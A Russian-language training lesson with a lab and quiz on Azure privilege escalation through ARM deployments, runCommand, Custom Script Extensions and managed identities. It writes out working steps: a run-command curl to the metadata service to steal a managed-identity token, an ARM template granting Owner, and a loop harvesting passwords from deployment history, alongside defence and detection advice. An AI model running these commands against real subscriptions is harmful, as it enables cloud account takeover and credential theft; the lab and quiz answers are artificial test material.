---
id: cloud-azure-arm
title: "ARM-шаблоны и deployments: PassRole по-azure'овски"
category: cloud
parent: cloud-azure-deep
difficulty: hard
order: 4
tags: [cloud, azure, arm, deployments, bicep, privesc, runcommand, managed-identity]
prerequisites: [cloud-azure-deep, cloud-azure-iam]
useful_for:
  - "Эскалация через развёртывания Azure"
  - "Атаки на IaC (ARM/Bicep)"
  - "Понимание модели прав ARM"
estimated_minutes: 55
summary: "Как ARM-развёртывания и Bicep становятся вектором эскалации: назначение ролей, runCommand на VM, custom script extensions, управляемые идентичности и чтение истории deployments ради секретов."
lab:
  kind: shell
  title: "Практика: ARM-шаблоны и PassRole по-azure"
  toolset: [core]
  workdir: /home/student/arm
  files: [task.md, notes.md, template.json, deployment-ops.json]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "`template.json` создаёт role assignment для managed identity."
    - "`deployment-ops.json` — операции деплоя, где может утечь секрет."
    - "Найди флаг: `grep nto deployment-ops.json > found.txt`."

---

## Задача

У твоей идентичности роль **Contributor** на подписке Azure. Contributor не даёт права `Microsoft.Authorization/roleAssignments/write`, поэтому напрямую выдать себе Owner нельзя. Но ARM-развёртывания всё равно открывают пути к эскалации: Contributor может выполнить команду на виртуальной машине, поставить расширение и прочитать историю развёртываний. Задача урока — понять модель прав **ARM** и превратить Contributor в выполнение кода и в роль.

## Что такое ARM и deployments

**Azure Resource Manager (ARM)** — управляющая плоскость Azure: все ресурсы создаются и меняются через ARM-вызовы. Иерархия такая: **Management Group → Subscription → Resource Group → Resources** (от общего к частному).

Развёртывание (**deployment**) — операция применения шаблона. Оно бывает на четырёх уровнях: resource group, подписка, management group и тенант. От scope зависит, роли какого уровня ты сможешь тронуть.

Шаблон — JSON с полями `$schema`, `resources`, `parameters`, `outputs`. Его можно запускать с `--parameters` (значения часто секретные) и с `mode: Incremental` или `Complete`.

Ключевые права, за которыми мы охотимся:

- `Microsoft.Resources/deployments/write` — создать развёртывание.
- `Microsoft.Authorization/roleAssignments/write` — назначить роль (входит в Owner и User Access Administrator).
- `Microsoft.Compute/virtualMachines/runCommand/action` — выполнить команду на VM.
- `Microsoft.Compute/virtualMachines/extensions/write` — поставить расширение (Custom Script Extension) → RCE.
- `Microsoft.ManagedIdentity/userAssignedIdentities/*` — создавать и привязывать managed identity.
- `Microsoft.Web/sites/publishxml/action` — получить publish profile (креды деплоя).
- `Microsoft.Resources/deployments/read` — читать историю (там секреты).

## Данные, с которыми работаем

Сначала разведка — что нам вообще разрешено:

```bash
$ az rest --method get \
    --url "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" \
    --query 'value[].actions[]' | grep -iE 'runCommand|extensions|managedIdentities|roleAssignments'
Microsoft.Compute/virtualMachines/runCommand/action
Microsoft.Compute/virtualMachines/extensions/write
Microsoft.ManagedIdentity/userAssignedIdentities/*
```

Видим: `roleAssignments/write` нет (значит, прямого Owner не будет), но есть `runCommand` и `extensions` — это код на VM. А у VM, скорее всего, есть managed identity.

## Шаг 1: Contributor → runCommand → managed identity VM

`runCommand` исполняется от `SYSTEM` (Windows) или root (Linux). Через него забираем токен managed identity VM из metadata-сервиса:

```bash
$ az vm run-command invoke -g myrg -n prod-vm --command-id RunShellScript \
    --scripts 'curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01"'
```

В выводе придёт `access_token`. Если у VM системная MI с ролью `Owner` на подписке — ты фактически Owner. Обрати внимание: `roleAssignments/write` для этого не нужен вообще.

## Шаг 2: тот же результат через Custom Script Extension

Если `runCommand` закрыт политикой, но открыт `extensions/write` — ставим расширение:

```bash
$ az vm extension set -g myrg --vm-name myvm --name customScript \
    --publisher Microsoft.Azure.Extensions --settings '{"commandToExecute":"id"}'
```

Эффект тот же: код от root на машине. Атакующий всегда проверяет оба API — политики часто блокируют только один.

## Шаг 3: если есть roleAssignments/write — назначаем Owner

Тогда эскалация прямая. Разворачиваем шаблон, который выдаёт твоей identity роль Owner (GUID `8e3af657-a8ff-443c-a75c-2fe8c4bcb635`):

```json
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [{
    "type": "Microsoft.Authorization/roleAssignments",
    "apiVersion": "2022-04-01",
    "name": "[guid(resourceGroup().id)]",
    "properties": {
      "roleDefinitionId": "[subscriptionResourceId('Microsoft.Authorization/roleDefinitions','8e3af657-a8ff-443c-a75c-2fe8c4bcb635')]",
      "principalId": "<your-object-id>"
    }
  }]
}
```

Это буквально **PassRole по-azure'овски**: развёртывание исполняется от твоего имени и выдаёт тебе права.

## Шаг 4: читаем историю deployments

Параметры развёртываний часто содержат `adminPassword`, `sqlConnectionString`, `apiKey` — прямой путь к данным:

```bash
$ for d in $(az deployment group list -g myrg --query '[].name' -o tsv); do
    az deployment group show -g myrg -n "$d" --query 'properties.parameters' 2>/dev/null
  done
"adminPassword": {"value": "Pr0d_P@ss!"}
"sqlConnectionString": {"value": "Server=db;User=sa;Password=...;"}
```

Даже без права разворачивать это даёт креды.

## Полный прогон от начала до конца

1. `permissions` → есть `runCommand`, `extensions`, нет `roleAssignments/write`.
2. `runCommand` на `prod-vm` → код от root → токен MI из `169.254.169.254`.
3. Если MI привилегированная — подписка под контролем.
4. Если есть `roleAssignments/write` — шаблон с roleAssignment → Owner.
5. История deployments → пароли и строки подключения.

## Если не сработало

- **Deny-политика.** `az policy assignment list` может запрещать `runCommand`/`extensions`. Проверяй оба API и другие scope.
- **Contributor только на RG.** Развёртывание на уровне группы не назначит роль на подписку — нужен `targetScope` выше и право там.
- **`Managed Identity Contributor`.** Позволяет создать MI и привязать её к контролируемому ресурсу, а затем получить её токен.
- **Publish profile.** Утёкший `sites/publishxml/action` даёт деплой кода в App Service.
- **Logic Apps / Automation Accounts.** Их `listCallbackUrl` и runbooks дают выполнение кода.
- **`mode: Complete`.** Опасно: удаляет ресурсы, которых нет в шаблоне. Согласуй перед применением.

## Защита и детект

Для защитника вывод прост: широкий `Contributor` — это почти Owner, потому что даёт код на VM. Ограничивают `deployments/write` и `roleAssignments/write`, запрещают `runCommand`/`extensions` политикой для продакшн-машин, а секреты держат в Key Vault references, а не в параметрах шаблонов. В Activity Log подозрительны события `Microsoft.Compute/virtualMachines/runCommand/action`, `.../extensions/write`, `Microsoft.Authorization/roleAssignments/write` и `Microsoft.Resources/deployments/write`; Defender for Resource Manager флагует их. Для пентеста это значит: чем «скучнее» событие, тем оно ценнее — обычное развёртывание редко кто читает.

## ARM в мульти-облаке

Модель «развёртывание от твоего имени создаёт ресурс с чужими правами» есть во всех облаках. В AWS это CloudFormation с `iam:PassRole` и созданием роли для EC2/Lambda; в GCP — Deployment Manager и создание service account; в Azure — именно ARM/Bicep и managed identity. Разница в деталях, но вывод один: любой IaC-пайплайн — это PassRole, и если ты можешь изменить шаблон или его параметры, ты можешь создать ресурс с более привилегированной идентичностью.

## Что мы теперь знаем

- ARM — управляющая плоскость; deployments бывают на четырёх scope.
- `Contributor` опаснее, чем кажется: он даёт `runCommand`/`extensions` (код на VM) и чтение истории развёртываний.
- Managed identity VM — мост от одной машины к подписке.
- `roleAssignments/write` — прямая выдача Owner; без него эскалируются через MI.
- Параметры deployments часто содержат секреты.

## На что смотреть дальше

- **cloud-bicep**: тот же deployment-механизм, но через Bicep и `deploymentScripts`.
- **cloud-azure-managed-identity**: как использовать захваченный токен.
- **cloud-azure-keyvault**: где искать секреты после эскалации.

## Глазами защитника

ARM deployments выполняются с правами пользователя или managed identity и могут назначать роли. Защита: ограничить `Microsoft.Authorization/roleAssignments/write` и не давать Contributor вместе с возможностью деплоить шаблоны. Использовать `what-if` и approvals для деплоев, аудит истории deployments. Custom Script Extension и runCommand — чувствительные: они дают выполнение кода на VM. Managed identity деплоя должна быть узкой.

## Частые вопросы

**Что такое ARM-шаблон?**

JSON-описание ресурсов Azure для декларативного развёртывания. В нём можно создавать ресурсы, назначать роли и запускать скрипты.

**Как Contributor превращается в Owner?**

Через `roleAssignments/write`: имея Contributor и право назначать роли (или деплой, который его выполняет), назначаешь себе Owner.

**Что даёт runCommand на VM?**

Выполнение команды от имени VM и доступ к её managed identity. Это прямой путь к кред-хентингу.

**Что такое Custom Script Extension?**

Расширение, скачивающее и запускающее скрипт на VM. Требует прав на изменение VM и даёт RCE.

**Где смотреть историю deployments?**

`az deployment group list` и `az deployment operation list` показывают, что и кем разворачивалось.

**Как защититься?**

Ограничить `roleAssignments/write`, давать узкие managed identity, использовать approvals и what-if, аудит deployments.

**Помогает ли Contributor без `roleAssignments`?**

Да, без права назначать роли Contributor не эскалирует напрямую, но `runCommand` на VM всё равно даёт креды.

**Что если есть только Reader?**

Reader не даёт изменений, но раскрывает конфигурацию и подсказки для дальнейшего доступа.

## Разбор: Contributor → runCommand → Owner

Атакующий получил Contributor на подписку. Он вызывает `az vm run-command invoke` с командой, читающей managed identity VM через IMDS, и получает токен. Токен позволяет вызвать ARM API. Затем он проверяет `roleAssignments/write`: если право есть, назначает себе Owner на подписку и получает полный контроль. Даже без этого шага он собирает секреты с VM и движется дальше. Защита — ограничить `runCommand` и `roleAssignments`, давать узкие MI.

## Что чаще всего упускают

То, что Contributor без явного `roleAssignments/write` всё равно опасен: `runCommand` и Custom Script Extension дают код на VM, а её managed identity — креды. Второе упущение — права деплоя: шаблон может сам назначать роли, если identity деплоя имеет на это право. Третье — история deployments: в ней видны шаблоны, которые атакующий может повторить. Вывод: проверяй не только прямые права, но и косвенные пути через деплой и `runCommand`.

**Можно ли эскалировать только через `runCommand`?**

Да: он даёт выполнение кода на VM, а её managed identity — креды. Даже без `roleAssignments` этого часто достаточно для движения вперёд.

**Что если нет прав на VM?**

Проверь деплой-историю и шаблоны: иногда можно запустить deployment с правами на другой ресурс.

## Квиз

Проверь себя.

```quiz
- question: "Почему Contributor в Azure опаснее, чем кажется?"
  options:
    - "Он позволяет runCommand/extensions на VM и чтение истории развёртываний"
    - "Он даёт доступ к биллингу"
    - "Он читает секреты Key Vault"
    - "Он назначает роли"
  answer: 0
  explanation: "Contributor не назначает роли, но даёт RCE на VM и доступ к параметрам deployments."
- question: "Какое право позволяет назначить себе Owner?"
  options:
    - "Microsoft.Authorization/roleAssignments/write"
    - "Microsoft.Compute/virtualMachines/runCommand/action"
    - "Microsoft.Web/sites/read"
    - "Microsoft.Storage/storageAccounts/read"
  answer: 0
  explanation: "roleAssignments/write входит в Owner и User Access Administrator."
- question: "Что даёт runCommand на VM?"
  options:
    - "Выполнение команд от SYSTEM/root и доступ к MI VM"
    - "Только чтение логов"
    - "Только перезагрузку"
    - "Смену тарифа"
  answer: 0
  explanation: "runCommand исполняет команды с высокими правами и позволяет забрать MI-токен."
- question: "Где в ARM часто лежат секреты?"
  options:
    - "В параметрах развёртываний (deployment history)"
    - "В тегах ресурсов"
    - "В именах ресурсов"
    - "В регионах"
  answer: 0
  explanation: "Параметры deployments часто содержат пароли и строки подключения."
- question: "Чем Custom Script Extension отличается от runCommand?"
  options:
    - "Это другой API с тем же эффектом — код от root на VM"
    - "Он только читает метрики"
    - "Он работает только на Windows"
    - "Он не требует прав"
  answer: 0
  explanation: "Политика может закрыть один API, но не второй, поэтому проверяют оба."
```

## Куда дальше

В следующем уроке мы возьмём **Azure Key Vault** — куда идти за секретами, когда права уже есть, и как устроены access policies и purge. А пока главное запомни: **ARM — это PassRole Azure: любое развёртывание может создать ресурс с чужими правами, а `Contributor` уже даёт код на VM.**

## Где пригодится

- **Пентест Azure:** эскалация через ARM и runCommand.
- **Red team:** PassRole-аналог, захват managed identity.
- **Bug bounty:** Azure-подписки с широкими ролями.
- **Blue team:** аудит ролей и детект runCommand/roleAssignments.
